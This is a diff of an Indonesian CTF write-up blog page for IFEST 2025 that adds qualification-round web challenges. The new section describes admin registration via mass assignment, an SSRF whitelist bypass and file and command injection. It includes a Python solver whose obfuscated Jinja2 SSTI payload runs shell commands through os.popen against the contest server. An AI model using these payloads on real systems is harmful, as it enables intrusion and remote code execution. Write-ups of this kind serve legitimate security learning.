@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-05-27T07:47:15.000Z">
-<meta property="article:modified_time" content="2025-05-27T09:08:58.493Z">
+<meta property="article:modified_time" content="2025-05-27T09:24:25.955Z">
 <meta property="article:author" content="Tanknight">
 <meta property="article:tag" content="nginx_misconfiguration">
 <meta property="article:tag" content="url_parser_discrepancies">
@@ -339,8 +339,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-05-27 16:08:58</span>
-            <span class="mobile">2025-05-27 16:08:58</span>
+            <span class="desktop">2025-05-27 16:24:25</span>
+            <span class="mobile">2025-05-27 16:24:25</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -386,12 +386,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>322 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>840 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>5 Mins</span>
         </span>
     
     
@@ -410,7 +410,93 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Web-v2"><a href="#Web-v2" class="headerlink" title="Web v2"></a>Web v2</h2><p><code>User(**data)</code> disini vulnerable, user bisa kasih parameter <code>is_admin=1</code> dan bisa keregister sebagai admin.</p>
+			<h1 id="QUAL"><a href="#QUAL" class="headerlink" title="QUAL"></a>QUAL</h1><h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="Web-V1"><a href="#Web-V1" class="headerlink" title="Web V1"></a>Web V1</h3><p>Kode Python tersebut mengambil input dari pengguna melalui berbagai parameter, lalu membuat akun pengguna berdasarkan parameter yang diberikan. Pada class User, terdapat atribut is_admin. Dengan menambahkan parameter <code>is_admin=1</code>, kita dapat mendaftarkan akun sebagai admin secara langsung.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img19.png"
+                     
+                ></p>
+<p>Register account, tambahin parameter <code>is_admin=1</code>.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img20.png"
+                     
+                ></p>
+<p>Pada endpoint <code>/admin/fetch</code> terdapat celah SSRF, di mana mekanisme whitelist-nya tidak aman. Sistem hanya memeriksa apakah string daffainfo.com terdapat dalam URL yang dikirimkan. Dengan memanfaatkan kelemahan ini, kita dapat menyisipkan daffainfo.com sebagai query parameter, sehingga URL seperti <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:1337/internal?daffainfo.com" >http://127.0.0.1:1337/internal?daffainfo.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> tetap lolos validasi dan kita bisa akses ke layanan internal.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img21.png"
+                     
+                ></p>
+<p>langsung kita ngerequest ke <code>/admin/fetch</code> endpoint dengan url parameter <code>http://127.0.0.1:1337/internal?daffainfo.com</code>.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img22.png"
+                     
+                ></p>
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>Parameter title, akan dicheck dengan blacklist, jika aman akan masuk ke function render_template_string.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img28.png"
+                     
+                ></p>
+<p>Salah satu proof of concept SSTI adalah <code>&#123;&#123;7*7&#125;&#125;</code> akan dievaluasi sebagai 49, akan tetapi karakter <code>&#123;&#123;` dan `&#125;&#125;</code> diblacklist.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img29.png"
+                     
+                ></p>
+<p>Nah ternyata masih ada proof of concept lainnya, yaitu dengan menggunakan <code>&#123;% if 7*7==49 %&#125; 49 &#123;% endif %&#125;</code></p>
+<p>Waktunya ngebypass blacklistnya untuk mendapatkan RCE. Nah aku ada resource untuk dapetin payload SSTI (<a class="link"   target="_blank" rel="noopener" href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/" >https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
+<p>Waktunya bikin solver.</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># Cat flag and save it to static/testing12312</span></span><br><span class="line">    payload = <span class="string">r&quot;&quot;&quot;&#123;% if request|attr(&#x27;\x61pplication&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5f\x62uiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fi\x6dport\x5f\x5f&#x27;)(&#x27;o\x73&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat reward/fl\x2a &gt;&gt; static/testing12312&#x27;) %&#125; a &#123;%endif%&#125;&quot;&quot;&quot;</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag</span></span><br><span class="line">    res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/static/testing12312&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text) <span class="comment"># IFEST13&#123;SSTI_byp4ss_f1lt3rs_to_w1n_R3W4RD&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delete static/testing12312 file (supaya tidak ada unintended buat orang lain)</span></span><br><span class="line">    payload = <span class="string">r&quot;&quot;&quot;&#123;% if request|attr(&#x27;\x61pplication&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5f\x62uiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fi\x6dport\x5f\x5f&#x27;)(&#x27;o\x73&#x27;)|attr(&#x27;popen&#x27;)(&#x27;rm static/testing12312&#x27;) %&#125; a &#123;%endif%&#125;&quot;&quot;&quot;</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_ssti</span>(<span class="params">url, payload</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?title=<span class="subst">&#123;quote(payload)&#125;</span>&quot;</span></span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    res = BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>).find(<span class="string">&#x27;h1&#x27;</span>, class_=<span class="string">&#x27;display-4 fst-italic&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://103.163.139.198:8888&quot;</span></span><br><span class="line">    solver(url)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img30.png"
+                     
+                ></p>
+<h3 id="Orbiterzzxx"><a href="#Orbiterzzxx" class="headerlink" title="Orbiterzzxx"></a>Orbiterzzxx</h3><p>Melakukan directory fuzzing, dan menemukan file <code>/phpinfo.php</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img23.png"
+                     
+                ></p>
+<p>Ditemukan credentials buat login dan flag part 1.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img24.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img25.png"
+                     
+                ><br>Flag part-1: <code>345Y_P34SY</code></p>
+<p>Ditemukan flag part 2 pada jwt cookie<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img26.png"
+                     
+                ><br>Flag part-2: <code>_L3M0N_</code></p>
+<p>Terdapat command injection, dan ditemukan flag part 3 pada file true_flag.txt</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img27.png"
+                     
+                ><br>Flag part-3: <code>5QU332Y</code></p>
+<p>Final flag: <code>IFEST13&#123;345Y_P34SY_L3M0N_5QU332Y!!!&#125;</code></p>
+<h1 id="FINAL"><a href="#FINAL" class="headerlink" title="FINAL"></a>FINAL</h1><h2 id="Web-Exploitation-1"><a href="#Web-Exploitation-1" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="Web-v2"><a href="#Web-v2" class="headerlink" title="Web v2"></a>Web v2</h3><p><code>User(**data)</code> disini vulnerable, user bisa kasih parameter <code>is_admin=1</code> dan bisa keregister sebagai admin.</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -493,7 +579,7 @@
                      data-src="/2025/05/27/IFEST-2025-CTF-Writeup/ifest2025-img12.png"
                      
                 ></p>
-<h2 id="PixelPlaza2"><a href="#PixelPlaza2" class="headerlink" title="PixelPlaza2"></a>PixelPlaza2</h2><p>Function staticHandler berikut vulnerable terhadap path traversal</p>
+<h3 id="PixelPlaza2"><a href="#PixelPlaza2" class="headerlink" title="PixelPlaza2"></a>PixelPlaza2</h3><p>Function staticHandler berikut vulnerable terhadap path traversal</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -577,7 +663,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">IFEST 2025 CTF Writeup</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Exploitation"><span class="nav-text">Web Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-v2"><span class="nav-text">Web v2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PixelPlaza2"><span class="nav-text">PixelPlaza2</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#QUAL"><span class="nav-text">QUAL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Exploitation"><span class="nav-text">Web Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-V1"><span class="nav-text">Web V1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass"><span class="nav-text">Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Orbiterzzxx"><span class="nav-text">Orbiterzzxx</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FINAL"><span class="nav-text">FINAL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Exploitation-1"><span class="nav-text">Web Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-v2"><span class="nav-text">Web v2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PixelPlaza2"><span class="nav-text">PixelPlaza2</span></a></li></ol></li></ol></li></ol>
 
 	</div>
 </div>
@@ -608,7 +694,7 @@
                     </span>
                     
                         <span>
-                            322 words in total
+                            840 words in total
                         </span>
                     
                 </p>
